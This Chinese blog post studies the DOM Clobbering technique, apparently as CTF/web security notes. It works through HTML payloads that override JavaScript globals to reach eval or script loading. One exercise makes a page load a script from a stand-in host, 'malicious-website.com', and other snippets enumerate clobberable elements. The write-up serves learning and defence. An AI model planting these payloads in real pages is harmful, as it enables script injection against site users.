---
title: DOM Clobbering Attack学习记录.md
url: 719.html
id: 719
categories:
  - 学习记录
date: 2020-02-15 13:18:53
tags:
  - ctf
  - web
  - 前端
---


很早就提出的攻击技巧了，都差不多忘记了，再拿出来复习复习。

<!-- more  -->

### 0x1 DOM Clobbering入门

之前在文章《前端中存在的变量劫持漏洞》中对id已经有了一些认识，我们知道有如下知识：

```html
<input id=username>
```

想在javascript中通过获取到此dom节点，出来使用`document.getElementById('username')`和`document.querySelector('#username')`之外还可以直接使用`window.username`来获取。

这个特性就被称为`DOM Cloberring`,可以造成很多有意思的漏洞，比如当程序依赖某些全局变量是否存在做某些分支跳转的时候：`if(window.isAdmin){ ... }`.

为了分析`DOM Clobbering`漏洞，假设我们有如下的代码：

```javascript
if (window.test1.test2) {
    eval(''+window.test1.test2)
}
```

想利用`Dom Clobbering`技巧来执行任意的js，首先需要解决两个问题。

1. 利用id，很容易在window对象上创建任意属性，但是我们能在新对象上创建新的属性吗？类似于(test1.test2)
2. 怎么控制 DOM elements被强制类型转换为string之后的值，大多数的dom节点被转换为stirng之后，都会返回`[object HTMLInputElement]`

为了解决第一个问题，我们很容易就想到`<form>`标签，因为每一个`<input>`标签的都会添加为它之上的`<form>`标签的属性，属性的名字就是`<input>`标签中声明的`name`属性，下面举一个例子：

```html
<form id=test1>
  <input name=test2>
</form>
<script>
  alert(test1.test2); // alerts "[object HTMLInputElement]"
</script>
```

为了解决第二个问题，我们用一段小代码HTML可能存在的所有标签，然后check对应的dom节点对象有没有实现`toString`方法，或者直接继承于`Object.prototype`。如果是继承自`Object.prototype`,那么很有可能只会返回`[object SomeElement]`。

```javascript
Object.getOwnPropertyNames(window)
.filter(p => p.match(/Element$/))
.map(p => window[p])
.filter(p => p && p.prototype && p.prototype.toString !== Object.prototype.toString)
```

执行完成后会返回两个属性,`HTMLAreaElement` (`<area>`) and `HTMLAnchorElement` (`<a>`),下面只说一下`<a>`标签吧（`<area>`标签类似）。`<a>`标签的`toString`会直接返回它的`href`属性。

```html
<a id=test1 href=https://securitum.com>
<script>
  alert(test1); // alerts "https://securitum.com"
</script>
```

此时把上面的两个问题放到一块解决，可能会想出这样的方式：

```html
<form id=test1>
  <a name=test2 href="x:alert(1)"></a>
</form>
```

但是并不行，`test1.test2`是`undefined`,因为`<input>`元素会变成`<form>`的属性，但是`<a>`标签并不会。

解决这个问题有个很有意思的方法，就是定义两个元素拥有一样的id：

```html
<a id=test1>click!</a>
<a id=test1>click2!</a>
```

我预期的是`window.test`会返回第一个`<a>`标签(因为`document.getElementById('#test1')`就会返回第一个)，但是确实一个HTMLCollection

```
>window.test1
<HTMLCollection(2) [a#test1, a#test1, test1: a#test1]
length: 2
0: a#test1
1: a#test1
test1: a#test1
__proto__: HTMLCollection
```

这里就有一个很有意思的点，`HTMLCollection`可以使用index进行访问，同时可以使用id访问，也就是`window.test1.test1`获取到的就是第一个元素。事实证明name属性也会直接注册为`HTMLCollection`的属性。

```html
<a id=test1>click!</a>
<a id=test1 name=test2>click2!</a>
```

```
> window.test1
< HTMLCollection(2) [a#test1, a#test1, test1: a#test1, test2: a#test1]length: 20: a#test11: a#test1test1: a#test1test2: a#test1__proto__: HTMLCollection
> window.test1.test2
<a id="test1" name="test2">click2!</a>
```

所以我们就可以利用下面的方法轻松解决之前的`eval(''+window.test1.test2)`的问题了。

```html
<a id="test1"></a><a id="test1" name="test2" href="x:alert(1)"></a>
```

### 0x2 一个简单的练习

```javascript
<script>
 window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
 };
</script>
```

为了利用这个漏洞，只需要向html中添加如下内容就可以了。

```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/malicious.js>
```

### 0x3 进阶

找出所有id具有父子依赖关系的节点。实现代码很简单，如下所示：

```javascript
        var log=[];
var html = ["a","abbr","acronym","address","applet","area","article","aside","audio","b","base","basefont","bdi","bdo","bgsound","big","blink","blockquote","body","br","button","canvas","caption","center","cite","code","col","colgroup","command","content","data","datalist","dd","del","details","dfn","dialog","dir","div","dl","dt","element","em","embed","fieldset","figcaption","figure","font","footer","form","frame","frameset","h1","head","header","hgroup","hr","html","i","iframe","image","img","input","ins","isindex","kbd","keygen","label","legend","li","link","listing","main","map","mark","marquee","menu","menuitem","meta","meter","multicol","nav","nextid","nobr","noembed","noframes","noscript","object","ol","optgroup","option","output","p","param","picture","plaintext","pre","progress","q","rb","rp","rt","rtc","ruby","s","samp","script","section","select","shadow","slot","small","source","spacer","span","strike","strong","style","sub","summary","sup","svg","table","tbody","td","template","textarea","tfoot","th","thead","time","title","tr","track","tt","u","ul","var","video","wbr","xmp"], logs = [];
div=document.createElement('div');
for(var i=0;i<html.length;i++) {
  for(var j=0;j<html.length;j++) {
    div.innerHTML='<'+html[i]+' id=element1>'+'<'+html[j]+' id=element2>';
    document.body.appendChild(div);
    if(window.element1 && element1.element2){
       log.push(html[i]+','+html[j]);
    }
    document.body.removeChild(div);
  }
}
console.log(log.join('\n'));
```

最后的输出是:

```
form,button
form,fieldset
form,image
form,img
form,input
form,object
form,output
form,select
form,textarea
```

所以向要生成`x.y.value`可以使用如下的方式：

```html
<form id=x><output id=y>I've been clobbered</output>
<script>
alert(x.y.value);
</script>
```

使用form标签可以来伪造三层的对象引用

```html
<form id=x name=y><input id=z></form>
<form id=x></form>
<script>
alert(x.y.z)
</script>
```

当form标签有两个一样的id的input标签的的时候，chrome会把input标签处理成为`[object RadioNodeList] `,这个对象有类似于数组的方法如forEach：

```html
<form id=x>
<input id=y name=z>
<input id=y>
</form>
<script>
x.y.forEach(element=>alert(element))
</script>
```

因为只有html规范中定义的属性才能注册为dom节点的属性，下面的例子就可以说明。

```html
<form id=x y=123></form>
<script>
alert(x.y)//undefined ， y不是html规范定义的form的属性。
</script>
```

所以我们可以利用如下的代码来看一下我们都有哪些可以用的属性：

```javascript
var html = ["a","abbr","acronym","address","applet","area","article","aside","audio","b","base","basefont","bdi","bdo","bgsound","big","blink","blockquote","body","br","button","canvas","caption","center","cite","code","col","colgroup","command","content","data","datalist","dd","del","details","dfn","dialog","dir","div","dl","dt","element","em","embed","fieldset","figcaption","figure","font","footer","form","frame","frameset","h1","head","header","hgroup","hr","html","i","iframe","image","img","input","ins","isindex","kbd","keygen","label","legend","li","link","listing","main","map","mark","marquee","menu","menuitem","meta","meter","multicol","nav","nextid","nobr","noembed","noframes","noscript","object","ol","optgroup","option","output","p","param","picture","plaintext","pre","progress","q","rb","rp","rt","rtc","ruby","s","samp","script","section","select","shadow","slot","small","source","spacer","span","strike","strong","style","sub","summary","sup","svg","table","tbody","td","template","textarea","tfoot","th","thead","time","title","tr","track","tt","u","ul","var","video","wbr","xmp"];//HTML elements array
var props=[];
for(i=0;i<html.length;i++){
  obj = document.createElement(html[i]);
   for(prop in obj) {
    if(typeof obj[prop] === 'string') {
      try {
        props.push(html[i]+':'+prop);
      }catch(e){}
    }
   }
}
console.log([...new Set(props)].join('\n'));
```

前面的代码展示了是string类型的属性，但是他们并不一定都是可以操作的，为了检查他们是否是可读可写的，需要用下面代码：

```javascript
        var props=[];
        DOM =document.getElementById("content");

        for(i=0;i<html.length;i++){
            obj = document.createElement(html[i]);
            for(prop in obj) {
                if(typeof obj[prop] === 'string') {
                    
                try {
                    DOM.innerHTML = '<'+html[i]+' id=x '+prop+'=1>';
                        if(document.getElementById('x')[prop] == 1) {
                            props.push(html[i]+':'+prop);
                    }
                    }catch(e){
                                                
                    }
                }
            }
        }
    console.log([...new Set(props)].join('\n'));
```

在这些DOM属性中有两个有意思的属性分别是"username"和"password",他们是`<a>`标签的DOM节点的属性，但是并不是html中定义的属性，好像并不能通过html属性控制。

这两个属性可以通过url的中的username字段和password字段提供。但是需要注意一定需要有`@`符号

```html
<a id=x href="ftp:Clobbered-username:Clobbered-Password@a">
<script>
alert(x.username)//Clobbered-username
alert(x.password)//Clobbered-password
</script>
```

用http协议也可以，但是需要添加 `//`

```html
    <a id=x href="http://Clobbered-username:Clobbered-Password@a">
        <script>
        alert(x.username)//Clobbered-username
        alert(x.password)//Clobbered-password
        </script>
```

需要注意一点，如果依赖于`<a>`标签的`toString`函数将dom对象转换为字符串，获取的字符串总是经过url编码的，例如下面这样：

```html
    <a id=x href="http:<>">
        <script>
        alert(x) //http://myip:8888/%3C%3E
        </script>
```

此时可以利用一些根本不存在的协议来绕过：

```html
    <a id=x href="abc:<>">
        <script>
        alert(x)//abc:<>
        </script>
```

Firefox浏览器允许在base标签中定义协议，然后在a标签中使用，能够获取到未经过urlencode的数据

```html
    <base href=a:abc><a id=x href="Firefox<>">
        <script>
        alert(x)//Firefox<>
        </script>
```

chrome浏览器也可以实现类似的效果，但是获取的值在base标签的href属性中。

```html
<base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>
<script>
alert(x.xyz)//a://Clobbered<>
</script>
```

### 0x4 获取三级以上的对象引用

使用iframe的srcdoc属性可以创建任意层数的对象引用。

```html
<iframe name=a srcdoc="
<iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
<script>setTimeout(()=>alert(a.b.c.d),500)</script>
```

当时上面有一个问题，就是必须使用`setTimeout`设置一个延迟以保证iframe加载完毕。这里好的办法是利用style/link标签导入一个外部的样式表来创造一个小的延迟：

```html
<iframe name=a srcdoc="
<iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
<style>@import '//portswigger.net';</style>
<script>
alert(a.b.c.d)
</script>
```

#### 参考链接

[https://research.securitum.com/xss-in-amp4email-dom-clobbering/](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)

[https://portswigger.net/research/dom-clobbering-strikes-back](https://portswigger.net/research/dom-clobbering-strikes-back)
